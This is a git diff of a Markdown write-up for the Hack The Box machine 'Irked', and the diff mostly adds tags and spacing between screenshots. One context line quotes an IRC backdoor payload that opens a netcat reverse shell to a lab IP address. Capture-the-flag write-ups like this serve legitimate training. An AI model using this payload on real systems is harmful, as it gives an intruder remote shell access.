@@ -9,7 +9,7 @@ menu:
     parent: htb-machines-linux
     weight: 10
 hero: images/irked.png
-tags: ["HTB"]
+tags: ["HTB", "searchsploit", "exploit-db", "hexchat", "irc", "python", "steganography", "steghide", "ssh", "su", "password-reuse", "metasploit", "exim"]
 ---
 
 # Irked
@@ -79,9 +79,13 @@ Nmap done: 1 IP address (1 host up) scanned in 21.24 seconds
   - And finally connect
 
 ![](./images/2.png)
+
 ![](./images/3.png)
+
 ![](./images/4.png)
+
 ![](./images/5.png)
+
 ![](./images/6.png)
 
 - Nothing interesting except the version of the software
@@ -102,6 +106,7 @@ Nmap done: 1 IP address (1 host up) scanned in 21.24 seconds
   - payload: `AB; rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/bash -i 2>&1|nc 10.10.16.3 6666 >/tmp/f`
 
 ![](./images/9.png)
+
 ![](./images/11.png)
 
 ## User
